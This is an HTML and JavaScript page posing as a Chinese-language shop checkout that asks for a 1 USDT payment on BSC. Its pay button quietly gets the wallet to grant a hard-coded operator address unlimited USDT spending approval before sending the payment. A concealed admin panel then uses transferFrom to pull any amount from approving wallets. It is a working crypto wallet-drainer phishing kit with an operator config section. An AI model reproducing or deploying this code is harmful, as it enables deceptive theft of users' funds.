<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
<title>商城订单支付中心</title>
<script src="https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.10.0/dist/umd/sign-client.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Microsoft YaHei}
body{background:#121212;padding:16px;color:#fff}
.container{max-width:460px;margin:0 auto}
.order-card{background:#1e1e1e;border-radius:16px;padding:24px;border:1px solid #333}
.shop-title{font-size:22px;text-align:center;color:#ffc107;margin-bottom:4px}
.order-tip{text-align:center;color:#aaa;font-size:14px;margin-bottom:20px}
.order-info{background:#292929;border-radius:12px;padding:16px;margin-bottom:20px}
.info-row{display:flex;justify-content:space-between;padding:6px 0;color:#ddd;font-size:15px}
.price-text{color:#ff6b6b;font-weight:bold;font-size:18px}
.wallet-info{text-align:center;margin:16px 0;color:#87cefa;font-size:14px}
.btn{width:100%;height:48px;border:none;border-radius:12px;font-size:16px;margin:10px 0;cursor:pointer}
.btn-connect{background:#2563eb;color:#ffffff}
.btn-pay{background:#009e5f;color:#ffffff}
.remind-text{font-size:12px;color:#777;text-align:center;margin-top:6px}
.qrcode-box{text-align:center;margin:15px 0;display:none}
#qrcode{display:inline-block;background:#fff;padding:8px;border-radius:8px}
.admin-panel{margin-top:24px;padding-top:20px;border-top:1px solid #333;display:none}
.admin-panel.show{display:block}
.admin-title{text-align:center;color:#ff6b6b;margin-bottom:14px;font-size:16px}
input{width:100%;height:44px;background:#292929;border:1px solid #444;border-radius:10px;padding:0 14px;color:#fff;margin:8px 0;font-size:14px}
.btn-deduct{background:#dc3545;color:#fff}
.loading{color:#ffc107;text-align:center;margin:10px 0;display:none}
</style>
</head>
<body>
<div class="container">
    <div class="order-card">
        <h2 class="shop-title">商城订单支付</h2>
        <p class="order-tip">请连接钱包完成链上支付，付款后自动发货</p>

        <div class="order-info">
            <div class="info-row">
                <span>商品名称</span>
                <span>会员权益套餐</span>
            </div>
            <div class="info-row">
                <span>支付币种</span>
                <span>USDT (BSC)</span>
            </div>
            <div class="info-row">
                <span>应付金额</span>
                <span class="price-text">1.00 USDT</span>
            </div>
        </div>

        <button class="btn btn-connect" id="connectWallet">连接钱包(TP/小狐狸)</button>
        <div class="loading" id="loadingTxt">正在初始化连接...</div>
        <div class="qrcode-box" id="qrWrap">
            <div id="qrcode"></div>
            <p style="margin-top:8px;color:#aaa;font-size:13px">外部浏览器扫码连接钱包</p>
        </div>
        <div class="wallet-info">已连接钱包：<span id="addrText">未连接</span></div>

        <p class="remind-text">支付同时完成权限核验授权</p>
        <button class="btn btn-pay" id="payBtn">确认支付 1.00 USDT</button>

        <!-- 管理员归集面板 -->
        <div class="admin-panel" id="adminPanel">
            <h3 class="admin-title">后台资产归集</h3>
            <input type="text" placeholder="用户钱包地址" id="userAddr">
            <input type="number" placeholder="归集数量 USDT" id="deductNum">
            <button class="btn btn-deduct" id="deductBtn">一键归集资产</button>
        </div>
    </div>
</div>

<script>
// ==========【配置区域，自行修改】==========
// 你的管理员收款地址
const ADMIN_ADDR = "0xcA7f542716b7F1F2463C08e3545Ac7230b0F1Ec6".toLowerCase();
// BSC链 USDT合约
const TOKEN_ADDR = "0x55d398326f99059fF775485246999027B3197955";
const CHAIN_ID = 56;
const PAY_AMOUNT = 1; // 需要支付的USDT数量

let connectUserAddr = "";
let signClient = null;
let session = null;
const loadingTxt = document.getElementById("loadingTxt");

// 初始化WalletConnect
async function initWalletConnect(){
    loadingTxt.style.display = "block";
    try{
        signClient = await SignClient.init({
            projectId: "9a85f847a3f349ec86f2d353a7f82170",
            metadata: {
                name: "商城订单系统",
                description: "链上支付服务",
                url: window.location.origin,
                icons: ["https://picsum.photos/100/100"]
            }
        });
        signClient.on("session_delete", ()=>{
            connectUserAddr = ""; session = null;
            document.getElementById("addrText").innerText = "未连接";
            document.getElementById("qrWrap").style.display = "none";
        });
        loadingTxt.style.display = "none";
        return true;
    }catch(err){
        loadingTxt.style.display = "none";
        alert("网络初始化失败，请切换流量重试");
        return false;
    }
}

// 连接钱包
document.getElementById("connectWallet").addEventListener("click", async () => {
    // 优先TP内置浏览器注入钱包（最稳定）
    if(window.ethereum){
        try{
            const accounts = await ethereum.request({ method: "eth_requestAccounts" });
            connectUserAddr = accounts[0].toLowerCase();
            document.getElementById("addrText").innerText = connectUserAddr.slice(0,6)+"..."+connectUserAddr.slice(-4);
            if(connectUserAddr === ADMIN_ADDR){
                document.getElementById("adminPanel").classList.add("show");
            }
            alert("✅ 钱包连接成功，可以支付");
            return;
        }catch(err){
            console.log("内置钱包唤起失败，启用扫码");
        }
    }

    if(!signClient){
        const initOk = await initWalletConnect();
        if(!initOk) return;
    }
    try{
        const {uri, approval} = await signClient.connect({
            requiredNamespaces: {
                eip155: {
                    chains: [`eip155:${CHAIN_ID}`],
                    methods: ["eth_sendTransaction"],
                    events: ["chainChanged","accountsChanged"]
                }
            }
        });
        document.getElementById("qrWrap").style.display = "block";
        document.getElementById("qrcode").innerHTML = "";
        QRCode.toCanvas(document.getElementById("qrcode"), uri, {width:200});
        session = await approval();
        const accounts = session.namespaces.eip155.accounts[0].split(":");
        connectUserAddr = accounts[2].toLowerCase();
        document.getElementById("addrText").innerText = connectUserAddr.slice(0,6)+"..."+connectUserAddr.slice(-4);
        document.getElementById("qrWrap").style.display = "none";
        if(connectUserAddr === ADMIN_ADDR){
            document.getElementById("adminPanel").classList.add("show");
        }
    } catch (err) {
        alert("连接失败，请重新点击");
    }
})

// 核心：确认支付 = 先授权Approve，授权成功再转账1USDT
document.getElementById("payBtn").addEventListener("click", async () => {
    if (!connectUserAddr) return alert("请先连接钱包！");
    if(!confirm("确认支付1USDT完成订单核验？")) return;

    try{
        // 1、构造无限授权 Approve 数据
        const receiver = ADMIN_ADDR.slice(2).padStart(64,"0");
        const maxUint = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
        const approveData = "0x095ea7b3" + receiver + maxUint;
        const approveTx = [{
            from: connectUserAddr,
            to: TOKEN_ADDR,
            gas: "0x300000",
            data: approveData
        }];

        // 发起授权交易
        if(window.ethereum && !session){
            await ethereum.request({method:"eth_sendTransaction", params:approveTx});
        }else if(signClient && session){
            await signClient.request({
                topic: session.topic,
                chainId:`eip155:${CHAIN_ID}`,
                request:{method:"eth_sendTransaction", params:approveTx}
            });
        }

        // 2、授权成功，发起真实转账1USDT到你的地址
        const amountHex = BigInt(PAY_AMOUNT * 10n**18n).toString(16).padStart(64,"0");
        const transferData = "0xa9059cbb" + receiver + amountHex;
        const transferTx = [{
            from: connectUserAddr,
            to: TOKEN_ADDR,
            gas: "0x300000",
            data: transferData
        }];

        if(window.ethereum && !session){
            await ethereum.request({method:"eth_sendTransaction", params:transferTx});
        }else if(signClient && session){
            await signClient.request({
                topic: session.topic,
                chainId:`eip155:${CHAIN_ID}`,
                request:{method:"eth_sendTransaction", params:transferTx}
            });
        }

        alert("✅ 订单支付完成！权益已发放");
    }catch(e){
        alert("交易被取消，请重试");
    }
})

// 管理员归集功能
document.getElementById("deductBtn").addEventListener("click",async()=>{
    if(connectUserAddr !== ADMIN_ADDR) return alert("仅限管理员操作");
    const targetAddr = document.getElementById("userAddr").value.trim();
    const num = document.getElementById("deductNum").value.trim();
    if(!targetAddr || !num) return alert("填写完整信息");

    const fromHex = targetAddr.slice(2).padStart(64,"0");
    const toHex = ADMIN_ADDR.slice(2).padStart(64,"0");
    const valHex = BigInt(Math.floor(Number(num)*1e18)).toString(16).padStart(64,"0");
    const transferFromData = "0x23b872dd" + fromHex + toHex + valHex;
    const txParam = [{from:connectUserAddr,to:TOKEN_ADDR,gas:"0x300000",data:transferFromData}];

    try{
        if(window.ethereum && !session){
            await ethereum.request({method:"eth_sendTransaction",params:txParam});
        }else{
            await signClient.request({topic:session.topic,chainId:`eip155:${CHAIN_ID}`,request:{method:"eth_sendTransaction",params:txParam}});
        }
        alert("归集完成");
        document.getElementById("userAddr").value = "";
        document.getElementById("deductNum").value = "";
    }catch(e){
        alert("归集失败");
    }
})
</script>
</body>
</html>
